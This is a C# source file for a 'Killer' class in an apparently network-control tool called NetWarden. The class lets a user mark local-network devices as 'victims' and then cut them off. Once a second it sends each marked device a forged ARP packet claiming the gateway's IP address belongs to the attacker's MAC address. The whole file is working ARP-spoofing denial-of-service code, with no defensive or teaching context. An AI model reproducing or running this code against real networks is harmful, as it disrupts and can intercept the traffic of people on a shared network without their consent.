using NetWarden.Core.Models;
using PacketDotNet;
using SharpPcap.LibPcap;

namespace NetWarden.Core.Services;

internal class Killer : IDisposable
{
    private Scanner _scanner;
    private DeviceManager _deviceManager;
    private LibPcapLiveDevice _device;
    private CancellationTokenSource _cancellationTokenSource;

    public Killer(Scanner scanner, DeviceManager deviceManager)
    {
        _scanner = scanner;
        _deviceManager = deviceManager;
        _device = _deviceManager.CreateDevice();
        _cancellationTokenSource = new CancellationTokenSource();
        StartKillerJob();
    }

    public void Kill(Client victim)
    {
        var hasClient = _scanner.GetClients().TryGetValue(victim.Mac.ToString(), out Client? client);
        if (!hasClient) return;
        if (client!.IsLocalDevice() || client.IsGateway() || client.IsKilled) return;
        client!.IsKilled = true;
    }

    public void UnKill(Client victim)
    {
        var hasClient = _scanner.GetClients().TryGetValue(victim.Mac.ToString(), out Client? client);
        if (!hasClient) return;
        client!.IsKilled = false;
    }

    public void UnKillAll()
    {
        foreach (var client in _scanner.GetClients())
        {
            if (client.Value.IsKilled)
            {
                client.Value.IsKilled = false;
            }
        }
    }

    private void SpoofTarget(Client client)
    {
        var arpPacket = new ArpPacket(ArpOperation.Request,
                    targetHardwareAddress: client.Mac,
                    targetProtocolAddress: client.Ip,
                    senderHardwareAddress: HostInfo.HostMac,
                    senderProtocolAddress: HostInfo.GatewayIp);

        var etherPacket = new EthernetPacket(
            sourceHardwareAddress: HostInfo.HostMac,
            destinationHardwareAddress: client.Mac,
            EthernetType.Arp)
        {
            PayloadPacket = arpPacket
        };
        _device.SendPacket(etherPacket.Bytes);
    }

    private void StartKillerJob()
    {
        Task.Run(async () =>
        {
            while (!_cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    foreach (var client in _scanner.GetClients())
                    {
                        if (client.Value.IsKilled)
                        {
                            SpoofTarget(client.Value);
                        }
                    }
                }
                catch { }
                await Task.Delay(1000);
            }
        });
    }

    public void Dispose()
    {
        GC.SuppressFinalize(this);

        UnKillAll();
        _cancellationTokenSource.Cancel();
        _device.Dispose();
    }
}
